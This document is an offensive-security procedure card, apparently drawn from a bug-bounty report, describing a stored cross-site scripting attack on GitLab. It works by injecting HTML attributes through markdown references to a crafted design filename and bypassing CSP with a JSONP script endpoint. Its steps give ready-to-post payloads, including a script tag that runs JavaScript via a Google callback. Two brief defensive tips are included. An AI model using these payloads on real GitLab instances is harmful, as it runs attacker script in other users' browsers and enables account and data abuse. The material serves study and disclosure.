---
tags:
  - xss
  - stored-xss
  - markdown-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
  - GitLab
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e553103d-b989-414f-84bd-1650cbe0c9c2
created_at: '2025-12-14T00:11:16.697Z'
updated_at: '2025-12-14T00:11:16.697Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject XSS via Markdown Reference

## Summary

This procedure references the malicious design in GitLab markdown to inject HTML attributes and execute arbitrary JavaScript, bypassing CSP.

## Description

By posting markdown that links to the injected filename, attributes break out and allow script injection via data-original replacement in ReferenceRedactor. This leads to stored XSS execution when the issue is viewed.

## Requirements

1. Existing project with malicious design uploaded
2. Ability to create new issues
3. Browser for inspecting HTML and triggering execution

## Defense

Defensive measures and detection strategies:

- Sanitize filenames in link_reference_pattern regex
- Escape URLs in string interpolation for link generation

## Objectives

1. Inject attributes into rendered markdown
2. Trigger JavaScript execution
3. Achieve CSP bypass

## Instructions

### Step 1: Create Issue with Basic Reference

**Context**: Inject initial attribute breakout.

Post markdown: <a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'> ' vakzz=here </a>.

> Observe injected attribute in HTML markup.

### Step 2: Create Issue with Payload

**Context**: Add data attributes to trigger redactor and execute payload.

Post markdown: <a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'> ' data-design="1" data-issue="1" data-reference-type="design" data-original=" <script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'></script> " </a>.

> Save and reload to execute XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- xss
- stored-xss
- markdown-injection
